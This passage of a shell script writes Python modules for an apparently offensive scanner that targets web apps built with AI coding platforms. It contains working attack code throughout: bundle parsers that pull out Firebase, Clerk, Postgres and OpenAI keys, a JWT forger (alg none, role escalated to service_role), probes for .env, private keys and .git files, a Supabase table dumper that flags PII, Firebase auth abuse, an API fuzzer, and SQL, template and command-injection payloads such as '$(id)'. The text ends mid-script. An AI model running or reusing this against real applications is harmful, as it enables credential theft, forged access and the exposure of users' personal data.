    "gpt_pilot":[r'gpt-pilot',r'pythagora\.io'],
    "devin":    [r'devin\.ai',r'cognition\.ai'],
    "aider":    [r'aider\.chat'],
    "copilot":  [r'github\.dev',r'copilot-workspace'],
    "plandex":  [r'plandex\.ai'],
    "allhands": [r'opendevin',r'all-hands\.dev'],
    "cody":     [r'sourcegraph\.com/cody'],
    "amazon_q": [r'aws\.amazon\.com/q'],
}.items():
    if any(re.search(p, b, re.I) for p in pats):
        result["vibe_platform"].append(plat)

# Frontend
if re.search(r'__NEXT_DATA__|next/dist|NextRouter', b): result["frontend"].append("nextjs")
elif re.search(r'createRoot|ReactDOM\.render|from "react"', b): result["frontend"].append("react")
if re.search(r'createApp\(|from "vue"', b):   result["frontend"].append("vue")
if re.search(r'SvelteComponent|from "svelte"', b): result["frontend"].append("svelte")
if re.search(r'@angular/core', b):             result["frontend"].append("angular")

# Backend/BaaS
if re.search(r'supabase\.co|@supabase/', b):   result["backend"].append("supabase")
if re.search(r'initializeApp.*firebase|firebaseConfig', b): result["backend"].append("firebase")
if re.search(r'ConvexClient|convex\.cloud|from "convex/', b): result["backend"].append("convex")
if re.search(r'PocketBase|pocketbase\.io', b): result["backend"].append("pocketbase")
if re.search(r'@vercel/postgres|neon\.tech|@neondatabase/', b): result["backend"].append("neon-postgres")
if re.search(r'@planetscale/', b):              result["backend"].append("planetscale")
if re.search(r'createTRPCClient|@trpc/', b):   result["backend"].append("trpc")
if re.search(r'from "express"|express\(\)', b):result["backend"].append("express")
if re.search(r'FastAPI\(\)|from fastapi', b):  result["backend"].append("fastapi")
if re.search(r'flask\.Flask|from flask', b):   result["backend"].append("flask")
if re.search(r'django\.core|urlpatterns', b):  result["backend"].append("django")
if re.search(r'from "hono"', b):               result["backend"].append("hono")
if re.search(r'from "elysia"', b):             result["backend"].append("elysia")

# ORM
if re.search(r'PrismaClient|@prisma/', b): result["orm"].append("prisma")
if re.search(r'drizzle-orm|from "drizzle"', b): result["orm"].append("drizzle")

# Auth
if re.search(r'@clerk/|Clerk\(', b):       result["auth"].append("clerk")
if re.search(r'auth0\.com|Auth0Client', b): result["auth"].append("auth0")
if re.search(r'NextAuth|next-auth', b):     result["auth"].append("nextauth")
if re.search(r'lucia-auth|from "lucia"', b):result["auth"].append("lucia")
if re.search(r'better-auth', b):            result["auth"].append("better-auth")

# Hosting
if re.search(r'vercel\.app|_vercel', b):    result["hosting"].append("vercel")
if re.search(r'netlify\.app', b):           result["hosting"].append("netlify")
if re.search(r'railway\.app', b):           result["hosting"].append("railway")
if re.search(r'onrender\.com', b):          result["hosting"].append("render")
if re.search(r'fly\.dev|fly\.io', b):       result["hosting"].append("fly.io")

# API
if re.search(r'/api/trpc/', b):  result["api_patterns"].append("trpc")
if re.search(r'/graphql|gql`', b): result["api_patterns"].append("graphql")
if re.search(r'/api/v\d', b):    result["api_patterns"].append("rest-versioned")

# Credentials
creds = {}
m = re.search(r'apiKey\s*:\s*["\']([A-Za-z0-9_\-]+)["\'].*?projectId\s*:\s*["\']([^"\']+)["\']', b, re.DOTALL)
if m:
    creds["firebase_api_key"]    = m.group(1)
    creds["firebase_project_id"] = m.group(2)
m2 = re.search(r'https://([a-z0-9\-]+)\.firebaseio\.com', b)
if m2: creds["firebase_rtdb_project"] = m2.group(1)
m3 = re.search(r'storageBucket\s*:\s*["\']([^"\']+)["\']', b)
if m3: creds["firebase_storage_bucket"] = m3.group(1)
m4 = re.search(r'https://[a-z0-9\-]+\.convex\.cloud', b)
if m4: creds["convex_url"] = m4.group(0)
m5 = re.search(r'pk_(test|live)_[A-Za-z0-9]+', b)
if m5: creds["clerk_pk"] = m5.group(0)
m6 = re.search(r'new PocketBase\(["\']([^"\']+)["\']', b)
if m6: creds["pocketbase_url"] = m6.group(1)
m7 = re.search(r'postgresql://[^\s"\'`]+', b)
if m7: creds["postgres_conn"] = m7.group(0)[:80]
m8 = re.search(r'sk-[a-zA-Z0-9]{48}', b)
if m8: creds["openai_key_CRITICAL"] = m8.group(0)[:20] + "..."
result["credentials"] = creds

for k in result:
    if isinstance(result[k], list):
        result[k] = sorted(set(result[k]))

print(json.dumps(result, indent=2))
ACADI_PYEOF

    # ── JWT decoder ────────────────────────────────────────────────────────
    cat > "${PYDIR}/jwt.py" << 'ACADI_PYEOF'
import sys, base64, json, time, datetime
jwt = sys.argv[1] if len(sys.argv) > 1 else ''
parts = jwt.strip().split('.')
if len(parts) != 3: print('Not a valid JWT'); sys.exit(0)
def pad(s): n = 4 - len(s) % 4; return s + '=' * n if n != 4 else s
try:
    hdr  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
    payl = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
except Exception as e:
    print(f'Decode error: {e}'); sys.exit(0)
print('  Header :', json.dumps(hdr,  indent=4))
print('  Payload:', json.dumps(payl, indent=4))
role = payl.get('role', '?')
exp  = payl.get('exp')
iat  = payl.get('iat')
print(f'  Role   : {role}')
print(f'  Issuer : {payl.get("iss","?")}')
if iat: print(f'  Issued : {datetime.datetime.utcfromtimestamp(iat).strftime("%Y-%m-%d %H:%M UTC")}')
if exp:
    rem = exp - int(time.time())
    if rem < 0: print(f'  Expiry : EXPIRED {abs(rem)//86400}d ago')
    else:       print(f'  Expiry : {datetime.datetime.utcfromtimestamp(exp).strftime("%Y-%m-%d %H:%M UTC")} ({rem//86400}d left)')
else:
    print('  Expiry : NONE — permanent token!')
if role == 'service_role': print('  [CRITICAL] SERVICE ROLE key!')
print(f'__ROLE__={role}')
print(f'__EXP__={"yes" if exp else "no"}')
ACADI_PYEOF

    # ── JWT attacker ───────────────────────────────────────────────────────
    cat > "${PYDIR}/jwt_atk.py" << 'ACADI_PYEOF'
import sys, base64, json
jwt = sys.argv[1]
parts = jwt.split('.')
if len(parts) != 3: sys.exit(1)
def pad(s): n = 4 - len(s) % 4; return s + '=' * n if n != 4 else s
def enc(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
hdr  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
payl = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
h2 = dict(hdr); h2['alg'] = 'none'
print('NONE|'   + enc(json.dumps(h2,   separators=(',',':')).encode()) + '.' + enc(json.dumps(payl, separators=(',',':')).encode()) + '.')
p2 = dict(payl); p2['role'] = 'service_role'
print('ROLE|'   + parts[0] + '.' + enc(json.dumps(p2, separators=(',',':')).encode()) + '.' + parts[2])
print('NOSIG|'  + parts[0] + '.' + parts[1] + '.')
ACADI_PYEOF

    # ── Schema parser ──────────────────────────────────────────────────────
    cat > "${PYDIR}/schema.py" << 'ACADI_PYEOF'
import sys, json, re
s_f = sys.argv[1]; o_f = sys.argv[2]
with open(s_f) as f: schema = json.load(f)
tables = {}
defs   = schema.get('definitions', schema.get('components', {}).get('schemas', {}))
paths  = schema.get('paths', {})
for path, ops in paths.items():
    m = re.match(r'^/([a-zA-Z_]\w*)$', path)
    if not m: continue
    tname = m.group(1)
    if tname.startswith('rpc'): continue
    methods = [k.upper() for k in ops if k in ('get','post','patch','delete','put')]
    cols = []
    defn = defs.get(tname, {}); props = defn.get('properties', {})
    req  = set(defn.get('required', []))
    for cn, ci in props.items():
        ct = ci.get('type','?'); cf = ci.get('format','')
        if cf: ct = f'{ct}({cf})'
        cols.append({'name':cn,'type':ct,'nullable':cn not in req})
    tables[tname] = {'columns':cols,'methods':methods}
with open(o_f,'w') as f: json.dump(tables, f, indent=2)
for t, i in sorted(tables.items()):
    print(f'TABLE:{t}:cols={len(i["columns"])}:methods={",".join(i["methods"])}')
ACADI_PYEOF

    # ── Web crawler ────────────────────────────────────────────────────────
    cat > "${PYDIR}/crawl.py" << 'ACADI_PYEOF'
import sys, re, urllib.request, urllib.error, json
from urllib.parse import urljoin, urlparse

base  = sys.argv[1]; depth = int(sys.argv[2])
maxu  = int(sys.argv[3]); outf = sys.argv[4]
UA    = 'Mozilla/5.0 (compatible; AcadiBot/1.0)'
host  = urlparse(base).netloc

SKIP  = re.compile(r'\.(png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|mp3|zip|gz)$', re.I)
SENS  = re.compile(r'admin|login|auth|user|profile|dashboard|config|secret|private|backup|debug|health|swagger|graphql|payment|webhook', re.I)
EXTRA = ['/robots.txt','/sitemap.xml','/.well-known/security.txt','/manifest.json',
         '/api','/api/v1','/graphql','/health','/status','/admin','/swagger',
         '/swagger.json','/openapi.json','/.git/HEAD','/.env','/.env.local']

def fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent':UA,'Accept':'*/*'})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.headers.get('Content-Type',''), r.read(500_000).decode('utf-8',errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, '', ''
    except Exception:
        return 0, '', ''

def links(body, cur):
    found = set()
    for pat in [r'href=["\']([^"\'<>\s#?]+)["\']', r'src=["\']([^"\'<>\s#?]+)["\']']:
        for m in re.finditer(pat, body):
            try:
                u = urljoin(cur, m.group(1))
                p = urlparse(u)
                if p.netloc == host and not SKIP.search(p.path):
                    found.add(p._replace(fragment='',query='').geturl())
            except: pass
    return found

visited = set(); queue = [(base, 0)]; results = []
while queue and len(visited) < maxu:
    url, d = queue.pop(0)
    if url in visited: continue
    visited.add(url)
    status, ct, body = fetch(url)
    results.append({'url':url,'status':status,'ct':ct[:50],'size':len(body),'depth':d,'interesting':bool(SENS.search(url))})
    if d < depth and status == 200 and body:
        for lnk in links(body, url):
            if lnk not in visited: queue.append((lnk, d+1))

for path in EXTRA:
    url = base.rstrip('/') + path
    if url in visited: continue
    status, ct, body = fetch(url)
    if status not in (0, 404):
        results.append({'url':url,'status':status,'ct':ct[:50],'size':len(body),'depth':0,'interesting':True})

with open(outf,'w') as f: json.dump(results, f, indent=2)
print(f'Crawled {len(results)} URLs', file=sys.stderr)
ACADI_PYEOF

    # ── Sensitive file scanner ─────────────────────────────────────────────
    cat > "${PYDIR}/filescan.py" << 'ACADI_PYEOF'
import sys, re, urllib.request, urllib.error, json, concurrent.futures
base = sys.argv[1]; outf = sys.argv[2]
UA   = __import__('os').environ.get('ACADI_UA','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36')

PATHS = [
    '/.env','/.env.local','/.env.production','/.env.development',
    '/.env.staging','/.env.backup','/.env.bak','/.env.example',
    '/config.js','/config.json','/config.yaml','/config.yml',
    '/settings.json','/app.config.js','/local.settings.json',
    '/appsettings.json','/web.config',
    '/supabase/config.toml','/supabase/seed.sql','/supabase/schema.sql',
    '/secrets.json','/credentials.json','/private.key','/private.pem',
    '/server.key','/id_rsa','/.ssh/id_rsa','/firebase.json','/.firebaserc',
    '/package.json','/package-lock.json','/yarn.lock','/composer.json',
    '/requirements.txt','/Pipfile','/poetry.lock',
    '/webpack.config.js','/vite.config.js','/tsconfig.json',
    '/docker-compose.yml','/docker-compose.yaml','/Dockerfile',
    '/nginx.conf','/.htaccess','/Procfile','/app.yaml','/serverless.yml',
    '/vercel.json','/netlify.toml','/railway.toml','/render.yaml',
    '/.git/config','/.git/HEAD','/.git/FETCH_HEAD',
    '/.git/refs/heads/main','/.git/refs/heads/master','/.gitignore',
    '/backup.sql','/dump.sql','/database.sql','/db.sql',
    '/backup.zip','/backup.tar.gz','/data.json','/export.csv',
    '/admin','/admin/','/admin/login','/phpinfo.php',
    '/debug','/_debug/','/health','/healthz','/_health',
    '/status','/ping','/metrics','/actuator','/actuator/health',
    '/actuator/env','/actuator/beans',
    '/swagger.json','/swagger.yaml','/openapi.json','/openapi.yaml',
    '/api-docs','/api-docs.json','/api/swagger.json',
    '/swagger-ui.html','/redoc','/graphql','/graphiql',
    '/robots.txt','/sitemap.xml','/.well-known/security.txt',
    '/.well-known/openapi.json','/.well-known/jwks.json',
    '/main.js.map','/app.js.map','/bundle.js.map',
    '/server-status','/server-info','/.DS_Store',
]

SECRET_PAT = re.compile(
    r'(?:password|passwd|secret|api_?key|access_?key)\s*[=:]\s*\S+'
    r'|eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
    r'|sk_live_[A-Za-z0-9]{24,}'
    r'|AKIA[0-9A-Z]{16}'
    r'|-----BEGIN (?:RSA )?PRIVATE KEY-----', re.IGNORECASE)

def probe(path):
    url = base.rstrip('/') + path
    req = urllib.request.Request(url, headers={'User-Agent':UA,'Accept':'*/*'})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read(80_000).decode('utf-8', errors='replace')
            ct   = r.headers.get('Content-Type','')
            sec  = [m.group(0)[:80] for m in SECRET_PAT.finditer(body)]
            return {'path':path,'url':url,'status':r.status,'ct':ct[:50],
                    'size':len(body),'secrets':sec,'preview':body[:200]}
    except urllib.error.HTTPError as e:
        if e.code not in (404,410):
            return {'path':path,'url':url,'status':e.code,'ct':'','size':0,'secrets':[],'preview':''}
        return None
    except Exception:
        return None

results = []
with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
    futs = {ex.submit(probe,p): p for p in PATHS}
    for fut in concurrent.futures.as_completed(futs):
        r = fut.result()
        if r:
            results.append(r)
            s = r['status']
            tag = ' [SECRETS!]' if r['secrets'] else ''
            print(f"  [{s}] {r['path']}{tag}")

with open(outf,'w') as f: json.dump(results, f, indent=2)
ACADI_PYEOF

    # ── Database query engine ──────────────────────────────────────────────
    cat > "${PYDIR}/dbquery.py" << 'ACADI_PYEOF'
import sys, json, re, urllib.request, urllib.error
supabase = sys.argv[1]; anon = sys.argv[2]
tables   = [t for t in sys.argv[3].split(',') if t.strip()]
outf     = sys.argv[4]; limit = int(sys.argv[5])
UA = 'Mozilla/5.0'
PII = re.compile(r'email|phone|password|ssn|cpf|rg|address|credit|card|token|secret|birth|name|fiscal', re.I)

def get(url):
    headers = {'apikey':anon,'Authorization':f'Bearer {anon}','Accept':'application/json','User-Agent':UA}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            return r.status, r.read().decode('utf-8',errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8',errors='replace')
    except Exception as e:
        return 0, str(e)

results = []
for tbl in tables:
    url = f'{supabase}/rest/v1/{tbl}?select=*&limit={limit}&order=id.desc'
    status, body = get(url)
    entry = {'table':tbl,'status':status,'rows':[],'columns':[],'pii_cols':[],'row_count':0,'label':''}
    try:
        data = json.loads(body)
        if isinstance(data, list):
            entry['rows']      = data[:min(limit,10)]
            entry['row_count'] = len(data)
            if data and isinstance(data[0], dict):
                entry['columns']  = list(data[0].keys())
                entry['pii_cols'] = [c for c in entry['columns'] if PII.search(c)]
            label = f'OPEN ({len(data)} rows)' if data else 'OPEN (empty or RLS active)'
        elif isinstance(data, dict) and 'message' in data:
            label = f'PROTECTED: {data["message"][:60]}'
        else:
            label = f'HTTP {status}'
    except Exception:
        label = f'PARSE_ERROR {status}'
    entry['label'] = label
    print(f'  [{status}] {tbl:<30} {label}')
    if entry['pii_cols']: print(f'    PII cols: {entry["pii_cols"]}')
    results.append(entry)

    # CSV export test
    try:
        req2 = urllib.request.Request(
            f'{supabase}/rest/v1/{tbl}?select=*&limit=5',
            headers={'apikey':anon,'Authorization':f'Bearer {anon}','Accept':'text/csv','User-Agent':UA})
        with urllib.request.urlopen(req2, timeout=10) as r2:
            csv_body = r2.read().decode('utf-8',errors='replace')
            if ',' in csv_body and len(csv_body) > 20:
                print(f'    CSV export: available')
                entry['csv_export'] = True
    except: pass

with open(outf,'w') as f: json.dump(results, f, indent=2, ensure_ascii=False)
ACADI_PYEOF

    # ── Firebase scanner ───────────────────────────────────────────────────
    cat > "${PYDIR}/firebase.py" << 'ACADI_PYEOF'
import sys, json, re, urllib.request, urllib.error
api_key=sys.argv[1] if len(sys.argv)>1 else ""
proj=sys.argv[2]   if len(sys.argv)>2 else ""
storage=sys.argv[3] if len(sys.argv)>3 else ""
outf=sys.argv[4]   if len(sys.argv)>4 else "/tmp/fb.json"
UA=__import__("os").environ.get("ACADI_UA","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
res={"vulns":[],"info":[],"data":{}}

def get(url,hdrs=None):
    h={"User-Agent":UA,"Accept":"*/*"}
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,headers=h)
    try:
        with urllib.request.urlopen(req,timeout=10) as r:
            return r.status,r.read().decode("utf-8",errors="replace")
    except urllib.error.HTTPError as e:
        return e.code,""
    except Exception:
        return 0,""

def post(url,body,hdrs=None):
    data=json.dumps(body).encode()
    h={"User-Agent":UA,"Content-Type":"application/json","Accept":"*/*"}
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,data=data,headers=h)
    try:
        with urllib.request.urlopen(req,timeout=10) as r:
            return r.status,r.read().decode("utf-8",errors="replace")
    except urllib.error.HTTPError as e:
        return e.code,e.read().decode("utf-8",errors="replace")
    except Exception:
        return 0,""

if not proj:
    print(json.dumps(res)); sys.exit(0)

# Firestore
fs=f"https://firestore.googleapis.com/v1/projects/{proj}/databases/(default)/documents"
s,b=get(fs+("?key="+api_key if api_key else ""))
if s==200:
    res["vulns"].append(f"Firestore readable without auth: {fs}")
    try: res["data"]["firestore"]=json.loads(b)
    except: pass
else: res["info"].append(f"Firestore: HTTP {s} (protected)")

# RTDB
rtdb=f"https://{proj}-default-rtdb.firebaseio.com/.json"
s2,b2=get(rtdb)
if s2==200:
    res["vulns"].append(f"Firebase RTDB is PUBLIC: {rtdb}")
    try: res["data"]["rtdb"]=json.loads(b2)
    except: res["data"]["rtdb"]=b2[:200]
else: res["info"].append(f"RTDB: HTTP {s2}")

# Storage
if storage:
    stor=f"https://firebasestorage.googleapis.com/v0/b/{storage}/o"
    s3,b3=get(stor)
    if s3==200:
        res["vulns"].append(f"Firebase Storage publicly listable: {storage}")
        try:
            items=json.loads(b3)
            res["data"]["storage"]=items.get("items",[])[:20]
        except: pass

# Auth — weak password
if api_key:
    sup=f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
    s4,b4=post(sup,{"email":"test_acadi@example.invalid","password":"123","returnSecureToken":True})
    if s4==200:
        res["vulns"].append("Firebase Auth accepts weak password '123' — no password policy!")
    # Email enumeration
    cau=f"https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key={api_key}"
    s5,b5=post(cau,{"identifier":"nonexistent_acadilovable@invalid.test","continueUri":"http://localhost"})
    if s5==200: res["vulns"].append("Firebase Auth email enumeration via createAuthUri")

print(json.dumps(res,indent=2))
with open(outf,"w") as f: json.dump(res,f,indent=2)
ACADI_PYEOF

    # ── Next.js scanner ────────────────────────────────────────────────────
    cat > "${PYDIR}/nextjs.py" << 'ACADI_PYEOF'
import sys, json, re, urllib.request, urllib.error
base=sys.argv[1] if len(sys.argv)>1 else ""
bfile=sys.argv[2] if len(sys.argv)>2 else ""
outf=sys.argv[3]  if len(sys.argv)>3 else "/tmp/nj.json"
bundle=open(bfile).read() if bfile else ""
UA=__import__("os").environ.get("ACADI_UA","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
res={"vulns":[],"info":[],"routes":[],"env_leaks":[]}

def get(url,hdrs=None):
    h={"User-Agent":UA,"Accept":"*/*"}
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,headers=h)
    try:
        with urllib.request.urlopen(req,timeout=8) as r:
            return r.status,dict(r.headers),r.read().decode("utf-8",errors="replace")
    except urllib.error.HTTPError as e:
        return e.code,{},""
    except Exception:
        return 0,{},""

base=base.rstrip("/")
s0,_,html=get(base+"/")
build_id=""
m=re.search(r'"buildId"\s*:\s*"([^"]+)"',html)
if m: build_id=m.group(1); res["info"].append(f"Next.js Build ID: {build_id}")

# /_next/data/ enumeration
if build_id:
    for path in ["/","/index","/home","/about","/login","/dashboard","/admin","/users","/settings"]:
        du=f"{base}/_next/data/{build_id}{path}.json"
        s,_,b=get(du)
        if s==200:
            res["routes"].append(du)
            res["info"].append(f"Next.js data route: {path}.json")
            try:
                pp=json.loads(b).get("pageProps",{})
                if any(k in str(pp).lower() for k in ["password","secret","token","key"]):
                    res["vulns"].append(f"Sensitive data in Next.js data route: {path}")
            except: pass

# Source maps
for mp in ["/_next/static/chunks/main.js.map","/_next/static/chunks/pages/_app.js.map"]:
    s,_,b=get(base+mp)
    if s==200 and b.startswith("{"):
        res["vulns"].append(f"Source map exposed: {mp} — original source code accessible!")
        break

# API routes from bundle
api_routes=set(re.findall(r'["\`]/api/([a-zA-Z0-9_/\-]+)["\`]',bundle))
for route in list(api_routes)[:30]:
    url=f"{base}/api/{route}"
    s,_,b=get(url)
    if s==200:
        res["info"].append(f"API route accessible: /api/{route}")
        if any(x in b.lower() for x in ['"password"','"token"','"secret"','"key"','"email"']):
            res["vulns"].append(f"Sensitive data in API: /api/{route}")

# Env leaks
risky=re.findall(r'process\.env\.([A-Z_]{4,})',bundle)
risky=[v for v in risky if not v.startswith("NEXT_PUBLIC_") and
       any(s in v for s in ["SECRET","KEY","TOKEN","PASSWORD","DATABASE","PRIVATE"])]
if risky:
    res["vulns"].append(f"Server-only env vars in client bundle: {risky}")
    res["env_leaks"]=risky

# NextAuth
na=f"{base}/api/auth/session"
s2,_,b2=get(na)
if s2==200 and len(b2)>5 and b2!="{}":
    try:
        sess=json.loads(b2)
        if sess.get("user"):
            res["vulns"].append("NextAuth /api/auth/session returns user data without auth!")
    except: pass

# tRPC
trpc=set(re.findall(r'["\`]/api/trpc/([a-zA-Z0-9.,]+)["\`]',bundle))
for route in list(trpc)[:10]:
    url=f"{base}/api/trpc/{route}?batch=1&input=%7B%7D"
    s3,_,b3=get(url)
    if s3==200:
        res["info"].append(f"tRPC endpoint accessible: {route}")
        res["routes"].append(f"/api/trpc/{route}")

print(json.dumps(res,indent=2))
with open(outf,"w") as f: json.dump(res,f,indent=2)
ACADI_PYEOF

    # ── API fuzzer ─────────────────────────────────────────────────────────
    cat > "${PYDIR}/apifuzz.py" << 'ACADI_PYEOF'
import sys, json, re, urllib.request, urllib.error, urllib.parse, concurrent.futures
base=sys.argv[1]; bfile=sys.argv[2]; outf=sys.argv[3]
bundle=open(bfile).read() if bfile else ""
UA=__import__("os").environ.get("ACADI_UA","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
res={"vulns":[],"info":[],"endpoints":[]}

def get(url,hdrs=None):
    h={"User-Agent":UA,"Accept":"application/json,*/*"}
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,headers=h)
    try:
        with urllib.request.urlopen(req,timeout=8) as r:
            return r.status,dict(r.headers),r.read().decode("utf-8",errors="replace")
    except urllib.error.HTTPError as e:
        return e.code,{},e.read().decode("utf-8",errors="replace")
    except Exception:
        return 0,{},""

base=base.rstrip("/")
disc=set()
for m in re.finditer(r'["\`](/(?:api|v1|v2|rest|graphql|trpc|rpc)[^\s"\'`<>]{0,80})["\`]',bundle):
    disc.add(re.sub(r'\$\{[^}]+\}','{id}',m.group(1)))

COMMON=["/api/users","/api/user","/api/me","/api/profile","/api/auth/session",
        "/api/auth/me","/api/auth/user","/api/posts","/api/items","/api/products",
        "/api/orders","/api/admin","/api/admin/users","/api/admin/stats",
        "/api/v1/users","/api/v1/auth/me","/api/v2/users",
        "/api/health","/api/status","/api/info","/api/debug","/api/config",
        "/api/settings","/api/env","/api/upload","/api/files","/api/images",
        "/api/webhooks","/api/callback","/api/export","/api/import",
        "/health","/status","/ping","/ready","/live","/metrics",
        "/actuator/health","/actuator/env","/__debug","/_debug",
        "/graphql","/api/graphql","/api/trpc"]
for p in COMMON: disc.add(p)

PII=re.compile(r'"(?:email|phone|password|ssn|cpf|address|credit_card|token|secret|private_key)"',re.I)
ERR=re.compile(r'traceback|stack trace|sql syntax|pg_query|sqlstate|exception at|Error:',re.I)

# Status codes worth reporting:
# 200/201 — accessible and returning content
# 301/302 — redirect (reveals endpoint existence)
# 403     — exists but forbidden (confirms endpoint)
# 405     — method not allowed (endpoint exists, try another method)
# 500     — server error (may disclose info)
# NEVER report 404 — endpoint simply does not exist

INTERESTING_CODES = {200, 201, 301, 302, 403, 405, 500, 501, 502, 503}
ACCESSIBLE_CODES  = {200, 201}

def probe(path):
    url=base+re.sub(r'\{[^}]+\}','1',path)
    s,hdrs,b=get(url)
    ep={"path":path,"url":url,"status":s,"size":len(b),"ct":hdrs.get("Content-Type","")[:50]}

    # Hard filter: 404 and other non-interesting codes = skip entirely
    if s not in INTERESTING_CODES:
        return None

    if s in ACCESSIBLE_CODES:
        ep["accessible"]=True
        # Only flag PII and errors on endpoints that actually return data
        if len(b) > 20:
            if PII.search(b): ep["pii"]=True
            if ERR.search(b): ep["error_disclosure"]=True
        try:
            data=json.loads(b)
            if isinstance(data,list) and len(data)>0:
                ep["row_count"]=len(data)
        except: pass

    elif s in (301, 302):
        ep["redirect_to"]=hdrs.get("Location","")
        ep["note"]="redirect — endpoint confirmed"

    elif s == 403:
        ep["note"]="forbidden — endpoint exists, auth required"

    elif s == 405:
        # Try the other common method
        s2,_,b2=get(url) if False else (0,{},"")
        ep["note"]="method not allowed — try POST/GET"

    elif s in (500, 502, 503):
        ep["server_error"]=True
        if len(b)>20: ep["err_body"]=b[:200]

    return ep

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futs={ex.submit(probe,p):p for p in disc}
    for fut in concurrent.futures.as_completed(futs):
        try:
            r=fut.result()
            if r is None:
                continue  # 404 or uninteresting — skip entirely
            res["endpoints"].append(r)
            s=r.get("status",0)
            if s in (200,201) and r.get("accessible"):
                msg=f"HTTP {s} {r['path']} ({r['size']}B)"
                if r.get("pii"):             res["vulns"].append(f"PII in API response: {r['path']}")
                if r.get("error_disclosure"):res["vulns"].append(f"Error/stack trace in API: {r['path']}")
                res["info"].append(msg)
            elif s in (301,302):
                res["info"].append(f"HTTP {s} (redirect) {r['path']} -> {r.get('redirect_to','')}")
            elif s==403:
                res["info"].append(f"HTTP 403 (auth required) {r['path']}")
            elif s in (500,502,503) and r.get("server_error"):
                res["vulns"].append(f"Server error {s} at: {r['path']}")
                res["info"].append(f"HTTP {s} server error: {r['path']}")
        except: pass

print(json.dumps(res,indent=2))
with open(outf,"w") as f: json.dump(res,f,indent=2)
ACADI_PYEOF

    # ── Injection tester ───────────────────────────────────────────────────
    cat > "${PYDIR}/inject.py" << 'ACADI_PYEOF'
#!/usr/bin/env python3
"""
Smart injection tester — SQLi, NoSQLi, SSTI, CMDi.
Only tests endpoints classified as api-dynamic or admin-panel.
Uses a time budget and early-exit logic.
"""
import sys, json, re, urllib.request, urllib.error, urllib.parse, time, os

classified_file = sys.argv[1] if len(sys.argv) > 1 else ""
out_file        = sys.argv[2] if len(sys.argv) > 2 else "/tmp/inject.json"
MAX_TIME        = int(sys.argv[3]) if len(sys.argv) > 3 else 90

UA = os.environ.get('ACADI_UA',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
     '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36')

res = {"vulns": [], "info": [], "tested": 0}

if not classified_file:
    print(json.dumps(res)); sys.exit(0)

try:
    data = json.load(open(classified_file))
except Exception:
    print(json.dumps(res)); sys.exit(0)

candidates = data.get('injection_candidates', [])
if not candidates:
    print("  No injection candidates identified by classifier")
    print(json.dumps(res))
    sys.exit(0)

# ── Detection patterns ────────────────────────────────────────────────────
SQLI_ERR = re.compile(
    r'syntax error|pg_query|mysql_error|ORA-\d{5}|sql syntax|sqlstate|'
    r'psycopg2|relation .* does not exist|column .* does not exist|'
    r'unterminated quoted|invalid input syntax|SQLite3?::|'
    r'Microsoft.*SQL.*Server|Unclosed quotation mark',
    re.IGNORECASE)

SSTI_RES = re.compile(r'\b49\b')   # 7*7 = 49
CMDI_RES = re.compile(r'uid=\d+\(|root:x:\d+|/bin/(sh|bash)|command not found')

# ── Minimal, high-signal payloads ─────────────────────────────────────────
SQLI = [
    ("sqli_quote",   "'"),                          # Single quote — triggers error
    ("sqli_or",      "' OR '1'='1"),                # Boolean bypass
    ("sqli_comment", "1' OR 1=1--"),                # MySQL/PG comment
]
SSTI = [
    ("ssti_jinja",   "{{7*7}}"),                    # Python Jinja2
    ("ssti_twig",    "{{7*'7'}}"),                  # PHP Twig
]
CMDI = [
    ("cmdi_pipe",    "test | id"),                  # Linux — id command
    ("cmdi_dollar",  "$(id)"),                      # Command substitution
]
NOSQLI = [
    ("nosqli_ne",    {"$ne": None}),                # MongoDB $ne bypass
]

def get(url, timeout=6):
    req = urllib.request.Request(url, headers={'User-Agent': UA, 'Accept': 'application/json,*/*'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(100_000).decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception:
        return 0, ""

def post(url, body, timeout=6):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data,
          headers={'User-Agent': UA, 'Content-Type': 'application/json',
                   'Accept': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(100_000).decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception:
        return 0, ""

def baseline(url, method):
    """Get a clean baseline response to compare against."""
    if method == 'POST':
        sc, body = post(url, {"id": 1})
    else:
        sc, body = get(url + "?id=1" if '?' not in url else url + "&id=1")
    return sc, len(body)

